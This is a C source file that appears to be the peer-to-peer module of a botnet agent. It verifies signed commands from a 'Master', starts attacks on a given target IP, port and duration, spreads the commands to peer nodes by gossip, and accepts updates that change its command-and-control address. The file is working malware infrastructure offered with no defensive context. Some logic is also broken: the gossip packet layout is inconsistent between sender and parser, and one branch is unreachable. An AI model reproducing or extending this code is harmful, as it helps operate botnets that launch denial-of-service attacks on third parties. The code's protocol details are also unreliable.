#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <fcntl.h>

#include "p2p.h"
#include "verify.h"
#include "attack.h"
#include "proxy.h"
#include "protocol_defs.h"

static Neighbor table[MAX_NEIGHBORS];
static int neighbor_count = 0;

// Nonce Replay Protection (Circular Buffer)
#define NONCE_BUFFER_SIZE 64
static uint32_t nonce_buffer[NONCE_BUFFER_SIZE];
static int nonce_index = 0;

static bool is_nonce_seen(uint32_t nonce) {
    for (int i = 0; i < NONCE_BUFFER_SIZE; i++) {
        if (nonce_buffer[i] == nonce) return true;
    }
    return false;
}

static void add_nonce(uint32_t nonce) {
    nonce_buffer[nonce_index] = nonce;
    nonce_index = (nonce_index + 1) % NONCE_BUFFER_SIZE;
}

int p2p_init(void) {
    // Zero out table
    memset(table, 0, sizeof(table));

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return -1;

    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(P2P_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("[P2P] Bind failed");
        close(sock);
        return -1;
    }
    
    // Non-blocking
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    return sock;
}

void p2p_add_neighbor(uint32_t ip, uint16_t port) {
    if (ip == 0 || port == 0) return;

    // 1. Check if exists
    for (int i = 0; i < MAX_NEIGHBORS; i++) {
        if (table[i].is_active && table[i].ip == ip && table[i].port == port) {
            table[i].last_seen = time(NULL);
            return;
        }
    }

    // 2. Find empty slot
    for (int i = 0; i < MAX_NEIGHBORS; i++) {
        if (!table[i].is_active) {
            table[i].ip = ip;
            table[i].port = port;
            table[i].last_seen = time(NULL);
            table[i].is_active = true;
            if (i >= neighbor_count) neighbor_count = i + 1;
            // printf("[P2P] New Neighbor Added: %08x\n", ip);
            return;
        }
    }

    // 3. Table full? Evict Random/Oldest (Simplified: Random)
    int evict_idx = rand() % MAX_NEIGHBORS;
    table[evict_idx].ip = ip;
    table[evict_idx].port = port;
    table[evict_idx].last_seen = time(NULL);
    table[evict_idx].is_active = true;
}

void p2p_handle_packet(int sock) {
    uint8_t buffer[1024];
    struct sockaddr_in src_addr;
    socklen_t addr_len = sizeof(src_addr);

    ssize_t len = recvfrom(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&src_addr, &addr_len);
    if (len < 0) return;

    if (len < 5) return; // Magic (4) + Count (1)

    // Check Magic
    // Check Magic
    uint32_t magic = *(uint32_t*)buffer;
    if (magic != htonl(P2P_MAGIC)) return; 

    // Packet Type
    uint8_t type = buffer[4];

    if (type == P2P_TYPE_GOSSIP) {
        // ... (Existing Gossip Logic) ...
        uint8_t count = buffer[5];
        int offset = 6;
        for (int i = 0; i < count; i++) {
            if (offset + 6 > len) break;
            uint32_t ip; uint16_t port;
            memcpy(&ip, buffer + offset, 4);
            memcpy(&port, buffer + offset + 4, 2);
            p2p_add_neighbor(ip, port);
            offset += 6;
        }
    } 
    else if (type == P2P_TYPE_CMD) {
        // [Magic(4)] [Type(1)] [Nonce(4)] [Sig(64)] [Len(2)] [Payload...]
        if (len < 5 + 4 + 64 + 2) return;

        int offset = 5;
        uint32_t nonce = ntohl(*(uint32_t*)(buffer + offset)); offset += 4;
        uint8_t *sig = buffer + offset; offset += 64;
        uint16_t payload_len = ntohs(*(uint16_t*)(buffer + offset)); offset += 2;

        if (offset + payload_len > len) return;
        uint8_t *payload = buffer + offset;
        
        // Replay Protection (Circular Buffer)
        if (is_nonce_seen(nonce)) {
            // Already processed this nonce, skip
            return;
        }

        // Verify Signature
        if (ed25519_verify(payload, payload_len, sig)) {
            // Valid Command from Master!
            add_nonce(nonce);  // Remember this nonce
            
            // Payload Format: [AttackType(1)] [IP(4)] [Port(2)] [Duration(4)]
            if (payload_len >= 11) {
                uint8_t atk_type = payload[0];
                uint32_t target_ip;
                uint16_t target_port;
                uint32_t duration;

                memcpy(&target_ip, payload + 1, 4);
                memcpy(&target_port, payload + 5, 2);
                memcpy(&duration, payload + 7, 4);
                
                // Conversions
                uint32_t ip_h = ntohl(target_ip); // If sent as BE
                uint16_t port_h = ntohs(target_port);
                uint32_t dur_h = ntohl(duration);

                // Execute Attack (IoT Layer)
                // Note: payload IP is likely Big Endian from Rust Master.
                attack_start(atk_type, target_ip, port_h, dur_h); // attack_start likely expects Host Endian? Actually sockets need BE.
                // Re-verification: attack_start usually takes Host Byte Order for logic, then converts to Network for raw sock.
                // Assuming attack_start takes Host Order IP.
                
                // Broadcast to Edge Subscribers (Downstream)
                proxy_broadcast(payload, payload_len);
                
                // Propagate (Gossip Flood)
                // Forward exact packet to random neighbors to ensure coverage
                // We forward the RAW buffer to preserve Signature/Nonce.
                for (int i = 0; i < 3; i++) {
                    int idx = rand() % MAX_NEIGHBORS;
                    if (table[idx].is_active) {
                        struct sockaddr_in dest;
                        dest.sin_family = AF_INET;
                        dest.sin_addr.s_addr = table[idx].ip;
                        dest.sin_port = table[idx].port;
                        sendto(sock, buffer, len, 0, (struct sockaddr *)&dest, sizeof(dest));
                    }
                }
            }
        }
    }
    // Reverse Propagation (0xCAFEBABE)
    else if (magic == htonl(WIRE_CONFIG_MAGIC)) {
        if (len < sizeof(WireSignedConfigUpdate)) return;
        
        WireSignedConfigUpdate *pkg = (WireSignedConfigUpdate*)buffer;
        
        static uint32_t current_version = 0;
        uint32_t pkg_version = ntohl(pkg->version);
        
        if (pkg_version <= current_version) return; // Replay/Old
        
        // Verify Signature
        // Master signs: magic + timestamp + version + ip_len + ip
        // Struct layout: [Magic(4)][Time(8)][Ver(4)][Len(1)][IP(64)][Sig(64)]
        // Signed data is everything BEFORE Sig.
        size_t signed_len = sizeof(WireSignedConfigUpdate) - 64;
        
        if (ed25519_verify(buffer, signed_len, pkg->signature)) {
            printf("[P2P] Valid Config Update Received! Version: %d\n", pkg_version);
            current_version = pkg_version;
            
            // Extract IP (Null terminate just in case)
            char new_ip[65];
            uint8_t ip_len = pkg->new_ip_len;
            if (ip_len > 64) ip_len = 64;
            memcpy(new_ip, pkg->new_ip, ip_len);
            new_ip[ip_len] = '\0';
            
            printf("[Config] Updating C2 to: %s\n", new_ip);
            // proxy_set_c2(new_ip); // Implementation dependent
            
            // Gossip Flood (Forward the WHOLE packet)
            for (int i = 0; i < 5; i++) { // More aggressive fan-out for config
                int idx = rand() % MAX_NEIGHBORS;
                if (table[idx].is_active) {
                    struct sockaddr_in dest;
                    dest.sin_family = AF_INET;
                    dest.sin_addr.s_addr = table[idx].ip;
                    dest.sin_port = table[idx].port;
                    sendto(sock, buffer, len, 0, (struct sockaddr *)&dest, sizeof(dest));
                }
            }
        } else {
             printf("[Warn] Invalid Config Signature!\n");
        }
    }
}

void p2p_gossip(int sock) {
    if (neighbor_count == 0) return;

    // Serialize Table
    uint8_t buffer[1024];
    uint32_t magic = htonl(P2P_MAGIC);
    memcpy(buffer, &magic, 4);
    buffer[4] = P2P_TYPE_GOSSIP; // Type
    
    // We can fit approx (1024 - 5) / 6 = ~169 entries.
    // Our max is 32. So send all active.
    
    int active_count = 0;
    int offset = 5;
    
    for (int i = 0; i < MAX_NEIGHBORS; i++) {
        if (table[i].is_active) {
            memcpy(buffer + offset, &table[i].ip, 4);
            memcpy(buffer + offset + 4, &table[i].port, 2);
            offset += 6;
            active_count++;
        }
    }
    buffer[4] = (uint8_t)active_count;

    // Send to random subset (fan-out 3)
    for (int i = 0; i < 3; i++) {
        int idx = rand() % MAX_NEIGHBORS;
        if (table[idx].is_active) {
            struct sockaddr_in dest;
            dest.sin_family = AF_INET;
            dest.sin_addr.s_addr = table[idx].ip;
            dest.sin_port = table[idx].port;
            
            sendto(sock, buffer, offset, 0, (struct sockaddr *)&dest, sizeof(dest));
        }
    }
}
